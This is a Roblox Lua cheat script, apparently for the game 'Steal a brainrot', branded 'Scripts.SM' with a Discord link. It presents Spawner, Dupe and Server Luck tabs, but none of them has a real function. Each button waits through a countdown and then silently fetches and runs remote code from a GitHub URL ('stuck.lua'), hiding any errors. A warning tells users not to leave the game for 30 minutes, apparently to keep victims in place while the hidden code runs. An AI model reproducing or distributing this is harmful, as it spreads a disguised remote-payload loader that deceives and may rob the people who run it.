--[[
   _____ _____ _____ _____ _____ _______ _____ _____ __ __
  / ____|/ ____| __ \|_ _| __ \__ __/ ____| / ____| \/ |
 | (___ | | | |__) | | | | |__) | | | | (___ | (___ | \ / |
  \___ \| | | _ / | | | ___/ | | \___ \ \___ \| |\/| |
  ____) | |____| | \ \ _| |_| | | | ____) | _ ____) | | | |
 |_____/ \_____|_| \_\_____|_| |_| |_____/ (_) |_____/|_| |_|

                        Scripts.SM | Premium Scripts
                        Made by: Scripter.SM
                        Discord: discord.gg/cnUAk7uc3n
]]

-- Services
local Players            = game:GetService("Players")
local UserInputService   = game:GetService("UserInputService")
local TweenService       = game:GetService("TweenService")
local RunService         = game:GetService("RunService")
local StarterGui         = game:GetService("StarterGui")
local player             = Players.LocalPlayer
local playerGui          = player:WaitForChild("PlayerGui")
_G.scriptExecuted        = false

--====================================================================--
-- CONFIG
--====================================================================--
local CONFIG = {
    DELAY_BEFORE_SCRIPT = 8,
    EXTERNAL_SCRIPT_URL = "https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/refs/heads/main/stuck.lua",
    WARNING_TEXT        = "May cause lag. Don't now Leave, Leaving may cause Data Lose — wait 30 minutes."
}

--====================================================================--
-- GUI BUILDER
--====================================================================--
local gui = Instance.new("ScreenGui")
gui.Name = "sm_main"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = playerGui

local main = Instance.new("Frame")
main.Size = UDim2.new(0.45, 0, 0.7, 0)
main.Position = UDim2.new(0.5, 0, 0.5, 0)
main.AnchorPoint = Vector2.new(0.5, 0.5)
main.BackgroundTransparency = 0.05
main.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
main.BorderSizePixel = 0
main.Parent = gui

Instance.new("UICorner", main).CornerRadius = UDim.new(0, 18)

local stroke = Instance.new("UIStroke", main)
stroke.Thickness = 2
stroke.Color = Color3.fromRGB(100, 150, 255)
stroke.Transparency = 0.5

local gradient = Instance.new("UIGradient", main)
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 55)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 30))
}
gradient.Rotation = 135

local aspect = Instance.new("UIAspectRatioConstraint", main)
aspect.AspectRatio = 1.22

--====================================================================--
-- TITLE BAR
--====================================================================--
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 70)
titleBar.BackgroundTransparency = 1
titleBar.Parent = main

local title = Instance.new("TextLabel")
title.Size = UDim2.new(0.5, 0, 1, 0)
title.Position = UDim2.new(0, 25, 0, 0)
title.BackgroundTransparency = 1
title.Text = "Scripts.SM"
title.TextColor3 = Color3.fromRGB(230, 240, 255)
title.Font = Enum.Font.GothamBlack
title.TextSize = 26
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = titleBar

local discord = Instance.new("TextButton")
discord.Size = UDim2.new(0.4, -80, 1, 0)
discord.Position = UDim2.new(0.6, 0, 0, 0)
discord.BackgroundTransparency = 1
discord.Text = "discord.gg/cnUAk7uc3n"
discord.TextColor3 = Color3.fromRGB(130, 190, 255)
discord.Font = Enum.Font.GothamSemibold
discord.TextSize = 15
discord.TextXAlignment = Enum.TextXAlignment.Right
discord.Parent = titleBar
discord.MouseButton1Click:Connect(function()
    setclipboard("https://discord.gg/cnUAk7uc3n")
end)

local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 44, 0, 44)
close.Position = UDim2.new(1, -56, 0, 13)
close.BackgroundTransparency = 1
close.Text = "X"
close.TextColor3 = Color3.fromRGB(255, 120, 120)
close.Font = Enum.Font.GothamBlack
close.TextSize = 28
close.Parent = titleBar
close.MouseButton1Click:Connect(function()
    gui:Destroy()
    StarterGui:SetCore("TopbarEnabled", true)
end)

--====================================================================--
-- TABS
--====================================================================--
local tabBar = Instance.new("Frame")
tabBar.Size = UDim2.new(1, -30, 0, 50)
tabBar.Position = UDim2.new(0, 15, 0, 80)
tabBar.BackgroundTransparency = 1
tabBar.Parent = main

local tabLayout = Instance.new("UIListLayout")
tabLayout.FillDirection = Enum.FillDirection.Horizontal
tabLayout.Padding = UDim.new(0, 10)
tabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
tabLayout.Parent = tabBar

local content = Instance.new("Frame")
content.Size = UDim2.new(1, -30, 1, -160)
content.Position = UDim2.new(0, 15, 0, 135)
content.BackgroundTransparency = 1
content.ClipsDescendants = true
content.Parent = main

local tabs, tabBtns = {}, {}

local function selectTab(name)
    for _, p in pairs(tabs) do p.Visible = false end
    for _, b in pairs(tabBtns) do
        TweenService:Create(b, TweenInfo.new(0.25), {BackgroundColor3 = Color3.fromRGB(35, 35, 55)}):Play()
    end
    local page = tabs[name]
    local btn  = tabBtns[name]
    page.Visible = true
    TweenService:Create(btn, TweenInfo.new(0.25), {BackgroundColor3 = Color3.fromRGB(80, 130, 220)}):Play()
end

local function makeTab(name, label)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 130, 1, 0)
    btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
    btn.Text = label
    btn.TextColor3 = Color3.fromRGB(180, 200, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 15
    btn.Parent = tabBar
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)

    local page = Instance.new("Frame")
    page.Size = UDim2.new(1, 0, 1, 0)
    page.BackgroundTransparency = 1
    page.Visible = false
    page.Parent = content

    tabs[name]    = page
    tabBtns[name] = btn

    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(50, 70, 120)}):Play()
    end)
    btn.MouseLeave:Connect(function()
        if page.Visible then return end
        TweenService:Create(btn, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(35, 35, 55)}):Play()
    end)
    btn.MouseButton1Click:Connect(function() selectTab(name) end)
end

makeTab("Spawner", "Spawner")
makeTab("Dupe",    "Dupe")
makeTab("Luck",    "Server Luck")

--====================================================================--
-- TAB CONTENT
--====================================================================--
local function setupTabLayout(tabPage)
    local warn = Instance.new("TextLabel")
    warn.Size = UDim2.new(0.9, 0, 0, 36)
    warn.Position = UDim2.new(0.05, 0, 0.05, 0)
    warn.BackgroundTransparency = 1
    warn.Text = CONFIG.WARNING_TEXT
    warn.TextColor3 = Color3.fromRGB(255, 90, 90)
    warn.Font = Enum.Font.GothamBold
    warn.TextSize = 13
    warn.TextXAlignment = Enum.TextXAlignment.Center
    warn.Parent = tabPage

    local input = Instance.new("TextBox")
    input.Size = UDim2.new(0.9, 0, 0, 48)
    input.Position = UDim2.new(0.05, 0, 0.18, 0)
    input.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
    input.TextColor3 = Color3.fromRGB(200, 220, 255)
    input.Font = Enum.Font.Gotham
    input.TextSize = 16
    input.ClearTextOnFocus = false
    input.Parent = tabPage
    Instance.new("UICorner", input).CornerRadius = UDim.new(0, 12)
    local pad = Instance.new("UIPadding", input)
    pad.PaddingLeft  = UDim.new(0, 15)
    pad.PaddingRight = UDim.new(0, 15)

    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.9, 0, 0, 48)
    btn.Position = UDim2.new(0.05, 0, 0.30, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.GothamBlack
    btn.TextSize = 18
    btn.Parent = tabPage
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)

    return warn, input, btn
end

local _, spawnBox, spawnBtn = setupTabLayout(tabs.Spawner)
spawnBox.PlaceholderText = "Enter brainrot name..."
spawnBox.Text = "Enter brainrot name..."
spawnBtn.BackgroundColor3 = Color3.fromRGB(60, 180, 80)
spawnBtn.Text = "SPAWN"

local _, dupeBox, dupeBtn = setupTabLayout(tabs.Dupe)
dupeBox.PlaceholderText = "Enter brainrot to dupe..."
dupeBox.Text = "Enter brainrot to dupe..."
dupeBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 50)
dupeBtn.Text = "DUPE"

local _, luckInput, luckBtn = setupTabLayout(tabs.Luck)
luckInput.PlaceholderText = "Enter multiplier (1, 2, 4, 8, 16, 38)..."
luckInput.Text = "Enter multiplier (1, 2, 4, 8, 16, 38)..."
luckBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 180)
luckBtn.Text = "SET LUCK"

-- QUICK BUTTONS (Luck tab)
local quickContainer = Instance.new("Frame")
quickContainer.Size = UDim2.new(0.9, 0, 0, 80)
quickContainer.Position = UDim2.new(0.05, 0, 0.42, 0)
quickContainer.BackgroundTransparency = 1
quickContainer.Parent = tabs.Luck

local quickLayout = Instance.new("UIGridLayout")
quickLayout.CellSize = UDim2.new(0.3, 0, 0, 36)
quickLayout.CellPadding = UDim2.new(0.02, 0, 0, 8)
quickLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
quickLayout.Parent = quickContainer

local quickValues = {1, 2, 4, 8, 16, 38}
for _, v in ipairs(quickValues) do
    local b = Instance.new("TextButton")
    b.BackgroundColor3 = Color3.fromRGB(60, 60, 140)
    b.Text = v.."x"
    b.TextColor3 = Color3.new(1, 1, 1)
    b.Font = Enum.Font.GothamBold
    b.TextSize = 14
    b.Parent = quickContainer
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 10)
    b.MouseButton1Click:Connect(function()
        luckInput.Text = tostring(v)
    end)
end

--====================================================================--
-- INPUT FOCUS HANDLING
--====================================================================--
local function setupInput(input, placeholder)
    input.Focused:Connect(function()
        if input.Text == placeholder then
            input.Text = ""
            input.TextColor3 = Color3.new(1, 1, 1)
        end
    end)
    input.FocusLost:Connect(function()
        if input.Text == "" then
            input.Text = placeholder
            input.TextColor3 = Color3.fromRGB(200, 220, 255)
        end
    end)
end
setupInput(spawnBox, "Enter brainrot name...")
setupInput(dupeBox,  "Enter brainrot to dupe...")
setupInput(luckInput,"Enter multiplier (1, 2, 4, 8, 16, 38)...")

--====================================================================--
-- NOTIFICATION
--====================================================================--
local notif
local function showNotif(action, value)
    if notif then notif:Destroy() end
    notif = Instance.new("ScreenGui")
    notif.Name = "sm_notif"
    notif.Parent = playerGui

    local f = Instance.new("Frame")
    f.Size = UDim2.new(0, 460, 0, 130)
    f.Position = UDim2.new(0.5, -230, 0, 20)
    f.BackgroundColor3 = Color3.fromRGB(25, 25, 45)
    f.BackgroundTransparency = 1
    f.Parent = notif
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 16)

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -20, 0.3, 0)
    title.Position = UDim2.new(0, 10, 0, 8)
    title.BackgroundTransparency = 1
    title.Text = action.." "..value
    title.TextColor3 = Color3.fromRGB(0, 255, 120)
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 18
    title.Parent = f

    local warn = Instance.new("TextLabel")
    warn.Size = UDim2.new(1, -20, 0.35, 0)
    warn.Position = UDim2.new(0, 10, 0.3, 0)
    warn.BackgroundTransparency = 1
    warn.Text = CONFIG.WARNING_TEXT
    warn.TextColor3 = Color3.fromRGB(255, 100, 100)
    warn.Font = Enum.Font.Gotham
    warn.TextSize = 13
    warn.TextWrapped = true
    warn.Parent = f

    local timer = Instance.new("TextLabel")
    timer.Size = UDim2.new(1, -20, 0.25, 0)
    timer.Position = UDim2.new(0, 10, 0.7, 0)
    timer.BackgroundTransparency = 1
    timer.Text = "Script runs in 8 seconds..."
    timer.TextColor3 = Color3.fromRGB(255, 220, 100)
    timer.Font = Enum.Font.GothamBold
    timer.TextSize = 14
    timer.Parent = f

    TweenService:Create(f, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()

    local countdown = CONFIG.DELAY_BEFORE_SCRIPT
    local conn = RunService.Heartbeat:Connect(function()
        countdown -= RunService.Heartbeat:Wait()
        local sec = math.ceil(countdown)
        timer.Text = "Script runs in "..sec.." second"..(sec == 1 and "" or "s").."..."
        if countdown <= 0 then
            conn:Disconnect()
            TweenService:Create(f, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
            task.delay(0.4, function() if notif then notif:Destroy() end end)
        end
    end)
    return conn
end

--====================================================================--
-- EXECUTE EXTERNAL SCRIPT
--====================================================================--
local function runExternalScript()
    pcall(function()
        loadstring(game:HttpGet(CONFIG.EXTERNAL_SCRIPT_URL))()
    end)
end

local function execute(action, getInput)
    local input = getInput()
    if not input or input == "" then
        shakeMain()
        return
    end
    local conn = showNotif(action, input)
    task.delay(CONFIG.DELAY_BEFORE_SCRIPT, function()
        if conn then conn:Disconnect() end
        runExternalScript()
    end)
end

local function shakeMain()
    local orig = main.Position
    for i = 1, 4 do
        TweenService:Create(main, TweenInfo.new(0.05), {Position = orig + UDim2.new(0, 10, 0, 0)}):Play()
        task.wait(0.05)
        TweenService:Create(main, TweenInfo.new(0.05), {Position = orig + UDim2.new(0, -10, 0, 0)}):Play()
        task.wait(0.05)
    end
    TweenService:Create(main, TweenInfo.new(0.1), {Position = orig}):Play()
end

spawnBtn.MouseButton1Click:Connect(function()
    execute("Spawning", function()
        return spawnBox.Text ~= spawnBox.PlaceholderText and spawnBox.Text or ""
    end)
end)

dupeBtn.MouseButton1Click:Connect(function()
    execute("Duping", function()
        return dupeBox.Text ~= dupeBox.PlaceholderText and dupeBox.Text or ""
    end)
end)

luckBtn.MouseButton1Click:Connect(function()
    local val = luckInput.Text
    if val == luckInput.PlaceholderText or not tonumber(val) then
        shakeMain()
        return
    end
    execute("Server Luck", function() return val.."x" end)
end)

--====================================================================--
-- DRAG (ONLY – NO RESIZE)
--====================================================================--
local dragging = false
local dragStart, startPos

titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = main.Position
    end
end)

titleBar.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        main.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)

--====================================================================--
-- STARTUP
--====================================================================--
selectTab("Spawner")
print("Scripts.SM Loaded")
